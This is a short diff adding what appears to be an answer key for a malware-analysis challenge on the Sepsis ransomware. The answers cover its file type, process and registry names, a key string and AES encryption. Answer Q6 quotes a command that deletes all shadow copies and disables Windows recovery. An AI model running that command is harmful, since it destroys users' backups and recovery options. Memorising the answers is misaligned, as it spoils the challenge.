@@ -1,0 +1,8 @@
+Sepsis  Q1=HTML
+Sepsis Q2=svchost
+Sepsis Q3 =SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+Sepsis Q4=Eventvwe.exe
+Sepsis Q5=HJG><JkFWYIguiohgt89573gujhuy78^*(&(^&^$
+Sepsis Q6=/c vssadmin.exe delete shadows /all /quiet & bcdedit.exe /set {default} recoveryenabled no & bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
+Sepsis Q7=DER
+Sepsis Q8=AES
